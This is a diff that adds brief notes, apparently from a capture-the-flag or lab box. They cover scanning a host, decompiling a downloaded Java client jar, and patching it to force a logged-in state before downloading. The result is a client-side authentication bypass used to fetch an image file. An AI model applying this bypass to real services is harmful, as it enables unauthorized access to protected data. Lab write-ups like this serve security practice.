@@ -1,0 +1,20 @@
+# Target
+9008/tcp open  java-object Java Object Serialization
+9010/tcp open  http        Apache httpd 2.4.38
+
+Get QOH_Client.jar from port 9010
+
+jd-gui
+	AuthState.java
+	Client.java
+
+# Revise
+Add `this.authState.getLoggedInStatus(true);` at the beginning of doDownload (line 101)
+
+# Compile (Create Client.class and AuthState.class)
+javac Client.java
+
+# Run
+java Client 172.15.27.21 9008
+2
+queen_of_hearts.png
